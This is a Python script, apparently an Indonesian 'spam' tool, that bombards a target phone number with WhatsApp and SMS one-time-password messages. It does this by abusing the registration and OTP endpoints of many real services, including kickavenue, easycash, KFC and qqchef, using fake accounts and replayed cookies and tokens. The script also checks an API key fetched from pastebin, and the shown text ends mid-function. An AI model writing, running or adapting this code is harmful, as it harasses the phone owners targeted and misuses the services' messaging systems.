"""
spam by ammarBN
decode by viewtech ofc
"""

import os,sys,time,requests,bs4,json,re,datetime,random,string
from datetime import datetime
from bs4 import BeautifulSoup
from colorama import Fore,init,Back
from rich.panel import Panel

# Membuka link YouTube di browser default Android

# Warna
H="\033[1;92m" # Hijau
P="\033[1;97m" # Putih
AB="\033[1;90m" # Abu Abu
Y="\033[1;93m" # Kuning
U="\033[1;95m" # Ungu
gktau="33[37;1m" # Entah
B="\033[1;96m" # Biru
W="\033[1;0m"
R = Fore.RED
name = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(15))

class Otp_Wa:
    def Otp1(self, nomor):
        url = "https://api.kickavenue.com/registers"
        headers = {
            "Host": "api.kickavenue.com",
            "Content-Length": "143",
            "Accept": "application/json, text/plain, */*",
            "User-Agent": "Mozilla/5.0 (Linux; Android 11; SM-A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "Origin": "https://www.kickavenue.com",
            "Sec-Fetch-Site": "same-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.kickavenue.com/",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
        }

        # Define the data
        data = {
            "email": f"{name}@gmail.com",
            "password": name,
            "password_confirmation": name,
            "mobile_number": f"+62{nomor}"
        }
        # Make the POST request
        response = requests.post(url, headers=headers, json=data)
        headers = {
            'Host': 'api.kickavenue.com',
            # 'content-length': '0',
            'accept': 'application/json, text/plain, */*',
            'user-agent': 'Mozilla/5.0 (Linux; Android 11; SM-A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36',
            'origin': 'https://www.kickavenue.com',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.kickavenue.com/',
            # 'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        response_code = requests.post(f'https://api.kickavenue.com/otp/send/sms/{response.json()["data"]["id"]}', headers=headers)
        if response_code.status_code == 200:
            return 'berhasil'
        else:return 'gagal'

    def Otp2(self, nomor):
        url = "https://loan.easycash.id/api/mobile/sendVerificationWithoutCaptcha"
        headers = {
            "Host": "loan.easycash.id",
            "content-length": "96",
            "platformtype": "WEB",
            "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
            "yqg-platform-device-token": "webFakeToken-1726404363554",
            "accept": "application/json, text/plain, */*",
            "build": "35313",
            "yqg-platform-sdk-type": "IDN_YQD",
            "yqg-platform-language": "id",
            "content-type": "application/json",
            "blackbox": "oWPIc1726404367ES4sE5ow0G2",
            "origin": "https://loan.easycash.id",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://loan.easycash.id/register-login",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cookie": (
                "deviceToken=webFakeToken-1726404363554; "
                "sajssdk_2015_cross_new_user=1; "
                "sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22191f5b805ecc4-007ccdec79a4d658-3a7a0a5e-367504-191f5b805eeb5%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTkxZjViODA1ZWNjNC0wMDdjY2RlYzc5YTRkNjU4LTNhN2EwYTVlLTM2NzUwNC0xOTFmNWI4MDVlZWI1In0%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%7D; "
                "_fbp=fb.1.1726404364208.304406689168566354; "
                "_tt_enable_cookie=1; "
                "_ttp=jyUZUOglVrrmkdG37oUf2jq1eVS; "
                "_ga=GA1.1.512112514.1726404367; "
                "_gcl_au=1.1.552118675.1726404367; "
                "_ga_Q2K59PZXB7=GS1.1.1726404366.1.1.172S6404391.0.0.0; "
                "_ttd_sync=1; "
                "_ga_M4NNTGXPZE=GS1.1.1726404367.1.1.1726404411.0.0.0"
            )
        }
        data = {
            "mobileNumber": f"0{nomor}",
            "notifType": "WHATSAPP",
            "verificationPurpose": "REGISTER_OR_LOGIN"
        }
        response = requests.post(url, headers=headers, json=data)
        print(response.text)
        if response.json()['body'] == True:
            return 'berhasil'
        else:return 'gagal'

    def Otp3(self, nomor):
        url = "https://order.kfcku.com/api/requestotp"
        headers = {
            "Host": "order.kfcku.com",
            "content-length": "71",
            "accept": "application/json, text/plain, */*",
            "culturecode": "id",
            "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
            "content-type": "application/json",
            "origin": "https://order.kfcku.com",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://order.kfcku.com/account/register",
            "cookie": (
                "_ga=GA1.1.654583334.1726403577; "
                "_ga_V9F809X5BJ=GS1.1.1726403576.1.0.1726403578.58.0.0; "
                "G_ENABLED_IDPS=google; "
                "_ga_VDQKXM3LBX=GS1.1.1726403582.1.1.1726403679.0.0.0"
            )
        }

        data = {
            "PhoneNumber": f"+62{nomor}",
            "source": "register",
            "token": "whatsapp"
        }

        response = requests.post(url, headers=headers, json=data)

    def Otp4(self, nomor):
        url = "https://daclen.com/register"
        headers = {
            "Host": "daclen.com",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; SM-A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "referer": "https://daclen.com/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        }

        response = requests.get(url, headers=headers)
        cok = (';'.join(['%s=%s'%(name, value) for name, value in response.cookies.get_dict().items()]))

        url = "https://daclen.com/api/otp/request"

        payload = {
            "nomor_telp": nomor,
            "referral": ""
        }

        headers = {
            "Host": "daclen.com",
            "content-length": "43",
            "accept": "application/json, text/plain, */*",
            "x-xsrf-token": response.cookies.get_dict()['XSRF-TOKEN'],
            "x-requested-with": "XMLHttpRequest",
            "authorization": "Bearer null",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; SM-A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://daclen.com",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://daclen.com/register",
            "cookie": f"_ga=GA1.1.385130915.1729081638; _fbp=fb.1.1729081639435.820346156872824066; {cok}; _ga_CVVQSJG659=GS1.1.1729081638.1.1.1729082190.0.0.0"
        }

        response = requests.post(url, json=payload, headers=headers)

    def Otp5(self, nomor):
        url = "https://dev.babamarket.co.id/v2/auth/otp/request"
        headers = {
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://seller.babamarket.co.id",
            "priority": "u=1, i",
            "referer": "https://seller.babamarket.co.id/",
            "sec-ch-ua": '"Not A(Brand";v="8", "Chromium";v="132", "Microsoft Edge";v="132"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0",
            "x-signature": "A/Lsr4xaxlGS8AFxP0UwZOTm8zoVHzHxz8dsatDDedM="
        }

        data = {
            "type": "phone",
            "phone": f"0{nomor}",
            "email": f"{name}@gmail.com",
            "is_register": "true"
        }

        response = requests.post(url, json=data, headers=headers)
    
#    def Otp6(self, nomor):
#        url = "https://www.synergyhub.id/wf/WebService.asmx/send_OTPRegistration_svc"
#        headers = {"Host": "www.synergyhub.id","content-length": "47","accept": "application/json, text/javascript, */*; q=0.01","x-requested-with": "XMLHttpRequest","user-agent": agent,"content-type": "application/x-www-form-urlencoded; charset=UTF-8","origin": "https://www.synergyhub.id","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.synergyhub.id/register"}
#        data = {"handphone": f'0{nomor}',"email": f"{name}@risu.be"}
#        response = requests.post(url, headers=headers, data=data)

    def Otp7(self, nomor):
        url = "https://api.astronauts.id/api/otp/generate"
        headers = {
            "Host": "api.astronauts.id",
            "content-length": "24",
            "x-device-version": "2.13.11",
            "x-api-version": "1.9.11",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; SM-A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
            "access-control-max-age": "7200",
            "content-type": "application/json",
            "accept": "application/json, text/plain, */*",
            "x-device": "web-customer",
            "x-device-id": "45b011e778aa92f4682f09915e1ee5ed77ef62063c447ef2ec40d2154928d233",
            "origin": "https://www.astronauts.id",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.astronauts.id/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
        }

        data = {"phone": f"0{nomor}"}
        response = requests.post(url, json=data, headers=headers)
        if response.status_code == 200:ketik(f"     {P}[{H}✓{P}] Successfully Send Spam WhatsApp (10)")
        else:ketik(f"     {P}[{Y}!{P}] Failed Send Spam WhatsApp (10)")

    def Otp8(self, nomor):
          url = "https://api-app.primaku.com/auth/v4/send-otp"
          headers = {"x-version": "2412275","user-agent": "Dart/3.0 (dart:io)","accept": "application/json","accept-encoding": "gzip","content-length": "126","host": "api-app.primaku.com","content-type": "application/json; charset=utf-8","apiversion": "2412275"}
          data = {"role": "PARENT","phoneNumber": f"62{nomor}","register": True,"isSocial": False,"delivery": "WA","email": f"{name}@gmail.com"}
          response = requests.post(url, json=data, headers=headers)
          if response.status_code == 200:ketik(f"     {P}[{H}✓{P}] Successfully Send Spam WhatsApp (11)")
          else:ketik(f"     {P}[{Y}!{P}] Failed Send Spam WhatsApp (11)")

class Otp_Sms:
    def Otp1(self, nomor):
        url = "https://toco.id/api/auth/register"
        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
        #   "cookie": "TiPMix=24.703066006022144; x-ms-routing-name=self; ARRAffinity=041b13006ac2c167cbc7f2014b2579445264f6811e747b214fae27d333018b63; ARRAffinitySameSite=041b13006ac2c167cbc7f2014b2579445264f6811e747b214fae27d333018b63; __rum_sid=%7B%22id%22%3A%22cef692e6cc35bd8c0cfdce5c89b7a7b5%22%2C%22startTime%22%3A1739344447418%7D; _ga=GA1.1.932886632.1739344479; _ga_QE87EGP3PC=GS1.1.1739344479.1.1.1739344502.37.0.0; ph_phc_FMWgqAdIoocjMpmw0ToaS16BRWAH4C1IThkrIkCWKAg_posthog=%7B%22distinct_id%22%3A%220194f902-df90-7c23-9370-017839863065%22%2C%22%24sesid%22%3A%5B1739344556732%2C%220194f902-e28e-7dd1-985d-6d86b5e40f71%22%2C1739344503437%5D%2C%22%24initial_person_info%22%3A%7B%22r%22%3A%22%24direct%22%2C%22u%22%3A%22https%3A%2F%2Ftoco.id%2Fregister%22%7D%7D",
            "origin": "https://toco.id",
            "priority": "u=1, i",
            "referer": "https://toco.id/register",
            "sec-ch-ua": '"Not A(Brand";v="8", "Chromium";v="132", "Microsoft Edge";v="132"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "traceparent": "00-d657bf3cad04dbb76a7b86933ab65c4a-2fe9fb9015881d64-01",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0"
        }

        data = {
            "registration_source": "phone",
            "credential": f"0{nomor}",
            "gender": "male",
            "name": name,
            "birthday": "2019-07-24",
            "password": "SDrere33355",
            "confirm_password": "SDrere33355"
        }

        response = requests.post(url, headers=headers, json=data)

    def Otp2(self, nomor):
        ses = requests.Session()
        url = "https://qqchef.net/register"
        headers = {
          "Host": "qqchef.net",
          "cache-control": "max-age=0",
          "upgrade-insecure-requests": "1",
          "user-agent": "Mozilla/5.0 (Linux; Android 11; SM-A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
          "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
          "sec-fetch-site": "none",
          "sec-fetch-mode": "navigate",
          "sec-fetch-user": "?1",
          "sec-fetch-dest": "document",
          "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
          "cookie": "PHPSESSID=a2pnd68vkpa0eung0o8atodp55; cart_cookie_id=475394155"
        }

        response = ses.get(url, headers=headers)
        url = "https://qqchef.net/shop/ajax/register.php?store=qq-chef"
        headers = {
          "Host": "qqchef.net",
          "accept": "*/*",
          "user-agent": "Mozilla/5.0 (Linux; Android 11; SM-A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
          "origin": "https://qqchef.net",
          "sec-fetch-site": "same-origin",
          "sec-fetch-mode": "cors",
          "sec-fetch-dest": "empty",
          "referer": "https://qqchef.net/register",
          "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
          "cookie": "PHPSESSID=a2pnd68vkpa0eung0o8atodp55; cart_cookie_id=475394155"
        }
        data = {
          "name": "Asepggg Ggihg",
          "phone[main]": nomor,
          "phone[full]": f"+62{nomor}",
          "email": f"{name}@risu.be",
          "password": "Jwow9w0292jbxU#7",
          "otp": "",
          "step": "1"
        }
        response = ses.post(url, headers=headers, data=data)
        if response.json()["success"] == True:ketik(f"     {P}[{H}✓{P}] Successfully Send Spam SMS (13)")
        else:ketik(f"     {P}[{Y}!{P}] Failed Send Spam SMS (13)")

    def Otp4(self, nomor):
          register_url = "https://account.sampingan.co/v1/register"
          register_headers = {    "Host": "account.sampingan.co",    "Content-Length": "269",    "Sec-Ch-Ua-Platform": '"Android"',    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36",    "Accept": "application/json, text/plain, */*",    "Sec-Ch-Ua": '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',    "Content-Type": "application/json",    "Sec-Ch-Ua-Mobile": "?1",    "Origin": "https://jobs.staffinc.co",    "Sec-Fetch-Site": "cross-site",    "Sec-Fetch-Mode": "cors",    "Sec-Fetch-Dest": "empty",    "Referer": "https://jobs.staffinc.co/",    "Accept-Encoding": "gzip, deflate, br, zstd",    "Accept-Language": "en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7",    "Priority": "u=1, i"}
          register_data = {    "agent": {        "name": "Kanevevd",        "gender": "MALE",        "dob": "1989-08-17T00:26:38.362Z",        "email": "jebieeoeb@gmail.com",        "province_id": "1",        "city_id": "544",        "phone_number": nomor,        "city_name": "Kab. Aceh Barat",        "country_code": "+62",        "privacy_policy_version": "1",        "tos_version": "1"    }}
          register_response = requests.post(register_url, json=register_data, headers=register_headers)
          if "AUTH_PERMISSION_ERR_ALREADY_REGISTERED" in register_response.text:
              headers = {    "Host": "auth.sampingan.co",    "sec-ch-ua-platform": "Android",    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36",    "Accept": "application/json, text/plain, */*",    "Content-Type": "application/json",    "sec-ch-ua-mobile": "?1",    "Origin": "https://jobs.staffinc.co",    "Sec-Fetch-Site": "cross-site",    "Sec-Fetch-Mode": "cors",    "Sec-Fetch-Dest": "empty",    "Referer": "https://jobs.staffinc.co/",    "Accept-Encoding": "gzip, deflate, br, zstd",    "Accept-Language": "en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7",    "Priority": "u=1, i"}
              url1 = "https://auth.sampingan.co/v1/agent/password-state"
              data1 = {"phone_number": nomor}
              response1 = requests.post(url1, headers=headers, json=data1)
              if response1.status_code == 200:
                  response_json = response1.json()
                  context_id = response_json.get("context_id")
                  url2 = "https://auth.sampingan.co/v1/otp"
                  data2 = {    "country_code": "+62",    "phone_number": nomor,    "method":"SMS",    "context_id": context_id}
                  response2 = requests.post(url2, headers=headers, json=data2).text
                  if "channel" in response2:ketik(f"     {P}[{H}✓{P}] Successfully Send Spam SMS (4)")
                  else:ketik(f"     {P}[{Y}!{P}] Failed Send Spam SMS (14)")
              else:ketik(f"     {P}[{Y}!{P}] Failed Send Spam SMS (14)")
          else:
              # Mengambil context_id dari respons registrasi
              register_response_data = register_response.json()
              context_id = register_response_data.get("context_id")
              otp_url = "https://auth.sampingan.co/v1/otp"
              otp_headers = {    "Host": "auth.sampingan.com",    "Content-Length": "123",    "Sec-Ch-Ua-Platform": '"Android"',    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36",    "Accept": "application/json, text/plain, */*",    "Sec-Ch-Ua": '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',    "Content-Type": "application/json",    "Sec-Ch-Ua-Mobile": "?1",    "Origin": "https://jobs.staffinc.co",    "Sec-Fetch-Site": "cross-site",    "Sec-Fetch-Mode": "cors",    "Sec-Fetch-Dest": "empty",    "Referer": "https://jobs.staffinc.co/",    "Accept-Encoding": "gzip, deflate, br, zstd",    "Accept-Language": "en-US,en;q=0.9,id-ID;q=0.8,id;q=0.7",    "Priority": "u=1, i"}
              otp_data = {    "country_code": "+62",    "phone_number": nomor,    "method":"SMS",    "context_id": context_id}
              otp_response = requests.post(otp_url, json=otp_data, headers=otp_headers)
              if otp_response.status_code == 200:
                  otp_response_data = otp_response.json()
                  ketik(f"     {P}[{H}✓{P}] Successfully Send Spam SMS (14)")
              else:ketik(f"     {P}[{Y}!{P}] Failed Send Spam SMS (14)")


    def Otp5(self, nomor):
          url = "https://api-app.primaku.com/auth/v4/send-otp"
          headers = {
              "x-version": "2412275",
              "user-agent": "Dart/3.0 (dart:io)",
              "accept": "application/json",
              "accept-encoding": "gzip",
              "content-length": "126",
              "host": "api-app.primaku.com",
              "content-type": "application/json; charset=utf-8",
              "apiversion": "2412275"
          }

          data = {
              "role": "PARENT",
              "phoneNumber": f"62{nomor}",
              "register": True,
              "isSocial": False,
              "delivery": "WA",
              "email": f"{name}@gmail.com"
          }

          response = requests.post(url, json=data, headers=headers)
          if response.status_code == 200:ketik(f"     {P}[{H}✓{P}] Successfully Send Spam SMS (15)")
          else:ketik(f"     {P}[{Y}!{P}] Failed Send Spam SMS (15)")

    def Otp6(self, nomor):
          url = "https://borzodelivery.com/id/jabodetabek"
          ses = requests.Session()
          headers = {
              "Host": "borzodelivery.com",
              "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="131", "Google Chrome";v="131"',
              "sec-ch-ua-mobile": "?0",
              "sec-ch-ua-platform": '"Windows"',
              "upgrade-insecure-requests": "1",
              "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
              "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
              "sec-fetch-site": "none",
              "sec-fetch-mode": "navigate",
              "sec-fetch-dest": "document",
          }
          get_items = ses.get(url, headers=headers)
          csrf = re.search('name="csrf-token" content="(.*?)"', str(get_items.text)).group(1)
          cookie = (';'.join(['%s=%s'%(name, value) for name, value in get_items.cookies.get_dict().items()]))

          url = "https://borzodelivery.com/id/user/send-sms"

          headers = {
              "Host": "borzodelivery.com",
              "content-length": "47",
              "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="131", "Google Chrome";v="131"',
              "accept": "application/json",
              "content-type": "application/json",
              "x-csrf-token": csrf,
              "sec-ch-ua-mobile": "?0",
              "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
              "sec-ch-ua-platform": '"Windows"',
              "origin": "https://borzodelivery.com",
              "sec-fetch-site": "same-origin",
              "sec-fetch-mode": "cors",
              "sec-fetch-dest": "empty",
              "referer": "https://borzodelivery.com/id/jabodetabek",
          }
          data = {
              "phone": f"620{nomor}___",
              "source": "signup"
          }
          response = ses.post(url, headers=headers, json=data, cookies={"cookie": cookie})
          if response.json()["is_successful"] == True:ketik(f"     {P}[{H}✓{P}] Successfully Send Spam SMS (16)")
          else:ketik(f"     {P}[{Y}!{P}] Failed Send Spam SMS (16)")
    def Otp7(self, nomor):
          url = "https://qqchef.net/shop/ajax/register.php?store=qq-chef"
          headers = {
              "Host": "qqchef.net",
              "accept": "*/*",
              "user-agent": "Mozilla/5.0 (Linux; Android 11; SM-A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
              "origin": "https://qqchef.net",
              "sec-fetch-site": "same-origin",
              "sec-fetch-mode": "cors",
              "sec-fetch-dest": "empty",
              "referer": "https://qqchef.net/register",
          }

          data = {
              "name": f"{name} Uwu",
              "phone[main]": f"0{nomor}",
              "phone[full]": f"+620{nomor}",
              "email": f"{name}@gmail.com",
              "password": f"{name}#0",
              "otp": "",
              "step": "1"
          }

          response = requests.post(url, headers=headers, data=data)
          if response.json()["message"] == "We've sent you a OTP code to your phone number":ketik(f"     {P}[{H}✓{P}] Successfully Send Spam SMS (17)")
          else:ketik(f"     {P}[{Y}!{P}] Failed Send Spam SMS (17)")
# Function-----------------------------
def hitung_mundur(detik=150):
    try:
        print(f"     {AB}\033[3mType CTRL+C for exit\033[0m")
        while detik:
            menit, dtk = divmod(detik, 150)
            print(f"     {P}[{Y}~{P}] Please Wait, Reload{R}: {H}{dtk:02}{P} [{Y}~{P}]  ", end="\r")
            time.sleep(1)
            detik -= 1
        anjay()
    except KeyboardInterrupt:
        sys.exit(f"\n     {P}[{Y}!{P}] System Exited")

def ketik(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./100)

def random_string(length=5):
    return ''.join(random.choices(string.ascii_letters, k=length))

def low_string(length=5):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

timelocal=localtime=time.asctime(time.localtime(time.time()))
ip=requests.get('https://api.ipify.org').text
baca3 = requests.get("https://sfile.mobi/8PVLH4wehae",headers={"User-Agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}).text
baca2 = bs4.BeautifulSoup(baca3,"html.parser").find_all("div",{"class":"list"})[3].text 
user=baca2.split("- Downloads:")[1]
def loading():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r     [+] Mengambil Apikey " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()

def loading2():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r     [+] Mengubah Mode... " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()

def loading3():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r     [+] Mengecek Apikey... " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()

# Login Menu ======================
def banner_login():
	print (f"""
{U}╦  {P}┌─┐┌─┐┬┌┐┌  {U}╔═╗{P}┌─┐┬┬┌─┌─┐┬ ┬
{U}║  {P}│ ││ ┬││││  {U}╠═╣{P}├─┘│├┴┐├┤ └┬┘
{U}╩═╝{P}└─┘└─┘┴┘└┘  {U}╩ ╩{P}┴  ┴┴ ┴└─┘ ┴ {Y}@{H} Made By AmmarBN
 {R}•{P} Note {R}:{H} Apikey{P} Sewaktu Waktu Akan Di Update {R}!""")

def check():
    try:
        os.system("clear")
        check = json.loads(open("package.json","r").read())
        url_apikey = requests.get("https://pastebin.com/raw/HcUAhQhB").json()
        check_apikey = requests.get(url_apikey["Key"]).json()
        if check_apikey["apikey"] in check["apikey"]:
            loading3()
            os.system("clear")
            banner_login()
            print ("""\033[1;97m({\033[31;1m'\033[1;97mstatus\033[31;1m'\033[1;97m:\033[13;1m'\033[1;92mApikey Valid.\033[31;1m\033[31;1m'\033[1;97m,\033[31;1m'\033[1;97mresponse\033[31;1m'\033[1;97m:\033[1;92m200\033[1;97m})""")
            time.sleep(6)
            os.system("clear")
            print (f"{P}Subrek {R}'{Y}Ammar Executed{R}' {H}✓")
            os.system("xdg-open https://youtube.com/@AmmarExecuted")
            time.sleep(4)
            anjay()
        else:
            loading3()
            os.system("clear")
            banner_login()
            os.system("rm -rf .trash/package.json")
            print (f" {R}╳{P} Apikey Salah {Y}-_-")
            time.sleep(4)
            os.system("clear")
            main()
    except requests.exceptions.ConnectionError:
        sys.exit(f"{P}[{R}!{P}] Error Connection Error....")
    except FileNotFoundError:
        main()

def main():
    try:
        banner_login()
        url_apikey = requests.get("https://pastebin.com/raw/HcUAhQhB").json()
        check_apikey = requests.get(url_apikey["Key"]).json()
        #url = url_apikey["Key"]
        api = requests.get('https://tinyurl.com/api-create.php?url=https://sfl.gl/wzwE').text
        print (f" {R}•{P} Link Download {R}:{H} {api}")
        apikey = input(f" {R}•{P} Apikey {R}:{H} ")
        if check_apikey["apikey"] in apikey:
            loading3()
            os.system("clear")
            banner_login()
            print (f" {H}✓ {P}Apikey Valid {Y}>_<")
            open("package.json","w").write(json.dumps({"apikey":apikey}))
            time.sleep(3)
            check()
        else:
            loading3()
            os.system("clear")
            banner_login()
            print (f" {R}╳{P} Apikey Salah {R}! {Y}-_-")
    except requests.exceptions.ConnectionError:
        sys.exit(f"{P}[{R}!{P}] Error Connection Error....")
    except KeyboardInterrupt:
        print(f"{P}[{R}•{P}] Exit")

def banner_anjay():
    os.system("clear")
    print(f"""
    {U}╦{P}┌┐┌┌┬┐┌─┐─┐ ┬{P} ↑ {U}╔═╗{P}┌─┐┌─┐┌┬┐
    {U}║{P}│││ ││├┤ ┌┴┬┘{Y}={R}•{Y}={U}╚═╗{P}├─┘├─┤│││
    {U}╩{P}┘└┘─┴┘└─┘┴ └─{P} ↓ {U}╚═╝{P}┴  ┴ ┴┴ ┴ {H}v.2

    {P}[{R}•{P}] Time{Y}:{P} {localtime}
    {P}[{R}•{P}] Ip  {Y}:{P} {ip}
    {P}[{R}•{P}] Total User{Y}:{P} {user}""")

def anjay():
    try:
        banner_anjay()
